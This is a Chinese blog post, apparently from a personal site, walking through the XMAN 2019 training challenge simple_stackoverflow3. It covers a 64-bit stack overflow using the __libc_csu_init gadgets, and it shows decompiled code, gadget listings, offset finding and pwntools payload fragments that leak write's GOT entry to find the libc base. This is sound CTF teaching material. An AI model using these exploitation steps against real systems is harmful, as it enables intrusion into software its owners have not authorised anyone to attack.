@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN-2019-福州-PWN-stackoverflow（下）">
+<meta property="og:url" content="http://yoursite.com/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-10T07:23:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XMAN-2019-福州-PWN-stackoverflow（下）">
+<meta name="twitter:description" content="今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverf">
+  <link rel="canonical" href="http://yoursite.com/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>XMAN-2019-福州-PWN-stackoverflow（下） | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╧┬ú⌐/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">XMAN-2019-福州-PWN-stackoverflow（下）
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-08-09 09:22:40" itemprop="dateCreated datePublished" datetime="2019-08-09T09:22:40-07:00">2019-08-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-08-10 00:23:02" itemprop="dateModified" datetime="2019-08-10T00:23:02-07:00">2019-08-10</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出<code>simple_stackoverflow2</code>到ROP的<code>simple_stackoverflow2_nx</code>过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。</p>
+<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
+<h2 id="simple-stackoverflow3"><a href="#simple-stackoverflow3" class="headerlink" title="simple_stackoverflow3"></a>simple_stackoverflow3</h2><p>这题没有源代码，我们直接看IDA Pro反汇编得出的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome        \n"</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  echo(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">echo</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    s2[i] = *(_BYTE *)(i + a1);</span><br><span class="line">  s2[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">"HEHE"</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;Welcome&#125;"</span>, s2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">" is not flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一下开启的安全保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这是一个64位程序，64位程序和我们之前一直做的32位程序在传参数方式上有很大的不同。</p>
+<p><code>linux_64</code>与<code>linux_86</code>的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>和 <code>R9</code>中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<code>gadget</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverlow3$ ROPgadget --binary simple_stackoverlow3 --only "pop|ret" </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
+
+<p> 我们可以发现程序现有的<code>gadget</code>并不能很好的构建<code>ROP</code>链条。其实在x64下有一些万能的gadgets可以利用。一般来说，只要程序调用了libc.so，程序都会有<code>__libc_csu_init()</code>这个函数用来对libc进行初始化操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400880</span> loc_400880:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400880</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400883</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400886</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400889</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040088</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400891</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400894</span>                 jnz     <span class="keyword">short</span> loc_400880</span><br><span class="line">.text:<span class="number">0000000000400896</span></span><br><span class="line">.text:<span class="number">0000000000400896</span> loc_400896:                             ; CODE XREF: __libc_csu_init+<span class="number">36</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400896</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040089</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040089B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040089</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040089</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004008</span>A0                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004008</span>A2                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004008</span>A4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>观察<code>0x000000000040089A</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040089A                 pop     rbx</span><br><span class="line">.text:000000000040089B                 pop     rbp</span><br><span class="line">.text:000000000040089C                 pop     r12</span><br><span class="line">.text:000000000040089E                 pop     r13</span><br><span class="line">.text:00000000004008A0                 pop     r14</span><br><span class="line">.text:00000000004008A2                 pop     r15</span><br><span class="line">.text:00000000004008A4                 retn</span><br></pre></td></tr></table></figure>
+
+<p>我们可以利用栈溢出构造栈上数据来控制 <code>rbx</code>,<code>rbp</code>,<code>r12</code>,<code>r13</code>,<code>r14</code>,<code>r15</code> 寄存器的数据。</p>
+<p>因为栈是从高地址到低地址生长，而计算机读取指令是从低地址到高地址如果我们的参数为</p>
+<p><code>argv[1]</code>, <code>argv[2]</code>, <code>argv[3]</code>, <code>argv[4]</code>, <code>argv[5]</code>, <code>argv[6]</code></p>
+<p>则他们在栈中的内存分布应该为</p>
+<table>
+<thead>
+<tr>
+<th align="center">High Adress</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">argv[6]</td>
+</tr>
+<tr>
+<td align="center">argv[5]</td>
+</tr>
+<tr>
+<td align="center">argv[4]</td>
+</tr>
+<tr>
+<td align="center">argv[3]</td>
+</tr>
+<tr>
+<td align="center">argv[2]</td>
+</tr>
+<tr>
+<td align="center">argv[1]</td>
+</tr>
+<tr>
+<td align="center">Low Adress</td>
+</tr>
+</tbody></table>
+<p>则执行指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>完成时的对应关系应该为</p>
+<table>
+<thead>
+<tr>
+<th align="center">argv[6]</th>
+<th align="center">R15</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">argv[5]</td>
+<td align="center">R14</td>
+</tr>
+<tr>
+<td align="center">argv[4]</td>
+<td align="center">R13</td>
+</tr>
+<tr>
+<td align="center">argv[3]</td>
+<td align="center">R12</td>
+</tr>
+<tr>
+<td align="center">argv[2]</td>
+<td align="center">RBP</td>
+</tr>
+<tr>
+<td align="center">argv[1]</td>
+<td align="center">RBX</td>
+</tr>
+</tbody></table>
+<p>从<code>0x0000000000400880</code>到 <code>0x0000000000400886</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, r13</span><br><span class="line">mov     rsi, r14</span><br><span class="line">mov     edi, r15d</span><br></pre></td></tr></table></figure>
+
+<p>我们可以将<code>R13</code> 赋给<code>RDX</code>, 将<code>R14</code>赋给<code>RSI</code>，将<code>R15D</code>赋给 <code>EDI</code>（需要注意的是，虽然这里赋给的是<code>EDI</code>，<strong>但其实此时<code>RDI</code>的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 <code>RDI</code> 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。</p>
+<p>也就是说只要我们控制<code>argv[4]</code>, <code>argv[5]</code>,<code>argv[6]</code>，就能分别控制<code>RDX</code>,<code>RSI</code>,<code>RDI</code></p>
+<p>此外，如果我们可以合理地控制<code>R12</code> 与 <code>rbx</code>，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 <code>RBX</code>为 0，<code>R12</code>为存储我们想要调用的函数的地址。</p>
+<p>控制<code>RBX</code>只需要<code>argv[1]</code>为0即可</p>
+<p>在<code>0x000000000040088D</code>通过<code>add     rbx, 1</code></p>
+<p>我们可以控制 RBX 与 RBP 的之间的关系为 RBX+1 = RBP，这样我们就不会执行<code>loc_400896</code>，进而可以继续执行下面的程序。</p>
+<p>整个程序逻辑是这样的，<code>main</code>函数中，用户可以输入<code>1024</code>个字节，并通过<code>echo</code>函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以<code>x00</code>作为字符串终止符，故如果我们的<code>payload</code>中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用<code>gadget</code>来为<code>write</code>函数传参，故肯定会在payload中包含<code>x00</code>字符。</p>
+<p> 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于<code>echo</code>函数的栈空间很小，与<code>main</code>函数栈中的输入字符串之间只间隔<code>32</code>字节，故我们可以利用这一点，只复制过去<code>24</code>字节数据加上一个包含连续4个<code>pop</code>指令的<code>gadget</code>地址，并借助这个<code>gadget</code>跳过原字符串的前32字节数据，我们就进入了<code>main</code>函数的栈，不受终止符的影响，即可进入我们正常的通用<code>gadget</code>调用过程</p>
+<p>简单来说就是把之前<code>main</code>栈里的24个<code>a</code>和一个<code>pppr</code>弹出来，接着不就可以之后写个<code>ret</code>，继续构造<code>ROP</code>了</p>
+<p>为什么是<code>32</code>个字节我们需要从系统的母函数和子函数的栈帧的分配看起</p>
+<table>
+<thead>
+<tr>
+<th align="center">高地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">栈底</td>
+</tr>
+<tr>
+<td align="center">较早的栈帧</td>
+</tr>
+<tr>
+<td align="center">调用者的栈帧</td>
+</tr>
+<tr>
+<td align="center">（被调用者）当前栈帧</td>
+</tr>
+<tr>
+<td align="center">栈顶</td>
+</tr>
+<tr>
+<td align="center">低地址</td>
+</tr>
+</tbody></table>
+<p>在这个情景下，<code>main</code>函数即为调用者，<code>echo</code>函数即为被调用者，即为当前栈帧。我们深入两个栈帧之间</p>
+<table>
+<thead>
+<tr>
+<th align="center">……</th>
+<th align="center">（main）调用者的栈帧</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">argv[n]</td>
+<td align="center">（main）调用者的栈帧</td>
+</tr>
+<tr>
+<td align="center">……</td>
+<td align="center">（main）调用者的栈帧</td>
+</tr>
+<tr>
+<td align="center">argv[1]</td>
+<td align="center">（main）调用者的栈帧</td>
+</tr>
+<tr>
+<td align="center">return address</td>
+<td align="center">（main）调用者的栈帧</td>
+</tr>
+<tr>
+<td align="center">（栈帧底）被保存的EBP</td>
+<td align="center">(echo)（被调用者）当前栈帧</td>
+</tr>
+<tr>
+<td align="center">被保存的寄存器、本地变量和临时变量</td>
+<td align="center">(echo)（被调用者）当前栈帧</td>
+</tr>
+<tr>
+<td align="center">参数构造区域</td>
+<td align="center">(echo)（被调用者）当前栈帧</td>
+</tr>
+</tbody></table>
+<p>当我们通过栈溢出覆盖掉<code>echo</code>的<code>EBP</code>地址栈底后，和上面<code>main</code>函数的栈还差一个<code>return address</code>的长度，我们知道在64位操作系统里面这个值即为<code>8</code>字节，而一个<code>ASCII</code>字母占用<code>2</code>个字节，故调用<code>4</code>次<code>POP</code>，把之前传入的<code>A</code>字母弹出<code>4</code>个，刚好为<code>8</code>个字节就跳到了<code>main</code>函数的参数地址</p>
+<p>这里顺便介绍一下通过<code>pattern.py</code>计算64位下的栈溢出点的方法</p>
+<p>首先还是一样的先创建出测试字符串</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 300 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>
+
+<p>老样子通过<code>GDB</code>调试复制粘贴输入</p>
+<p>这里需要注意在64位的情况下，因为<code>ret</code>相当于<code>pop rip</code>指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。在<code>GDB</code>里，<code>x</code>是查看内存的指令，随后的<code>gx</code>代表数值用64位16进制显示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> x/gx $rsp</span><br><span class="line">0x7fffffffda48:	0x6241396141386141</span><br></pre></td></tr></table></figure>
+
+<p>随后我们就可以用pattern.py来计算溢出点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x6241396141386141hex pattern decoded as: Aa8Aa9Ab</span><br><span class="line">24</span><br></pre></td></tr></table></figure>
+
+<p>和我们看代码分析得到的溢出点一致即为<code>24</code>个字节</p>
+<p>则<code>payload1</code>可以这样构造，首先</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 =  <span class="string">"A"</span> * <span class="number">16</span> + fakeebp</span><br><span class="line">payload1 += p64(pop4address)</span><br></pre></td></tr></table></figure>
+
+<p>使程序进入main函数的栈里面，然后就是我们正常的ROP构造过程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(pop6address) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这时完成的栈和寄存器的对照关系</p>
+<table>
+<thead>
+<tr>
+<th align="center">argv[6]</th>
+<th align="center">R15</th>
+<th align="center">1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">argv[5]</td>
+<td align="center">R14</td>
+<td align="center">write_got</td>
+</tr>
+<tr>
+<td align="center">argv[4]</td>
+<td align="center">R13</td>
+<td align="center">8</td>
+</tr>
+<tr>
+<td align="center">argv[3]</td>
+<td align="center">R12</td>
+<td align="center">write_got</td>
+</tr>
+<tr>
+<td align="center">argv[2]</td>
+<td align="center">RBP</td>
+<td align="center">1</td>
+</tr>
+<tr>
+<td align="center">argv[1]</td>
+<td align="center">RBX</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<p>然后的payload即为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 += p64(movcalladdress)</span><br></pre></td></tr></table></figure>
+
+<p>这时write参数构造完毕，对照关系表有</p>
+<table>
+<thead>
+<tr>
+<th align="center">argv[6]</th>
+<th align="center">1</th>
+<th align="center">R15</th>
+<th align="center">EDI(RDI)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">argv[5]</td>
+<td align="center">write_got</td>
+<td align="center">R14</td>
+<td align="center">RSI</td>
+</tr>
+<tr>
+<td align="center">argv[4]</td>
+<td align="center">8</td>
+<td align="center">R13</td>
+<td align="center">RDX</td>
+</tr>
+</tbody></table>
+<p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可,使程序返回开始地址，循环利用echo函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 += <span class="string">"A"</span> * <span class="number">56</span> <span class="comment"># 8 * 8 = 56</span></span><br><span class="line">payload1 += p64(startAddress)</span><br></pre></td></tr></table></figure>
+
+<p>之后收到完成延迟绑定后<code>write</code>函数的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
+
+<p>即可计算出<code>libc</code>的基地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.address = write_addr-libc.symbols[<span class="string">"write"</span>]</span><br></pre></td></tr></table></figure>
+
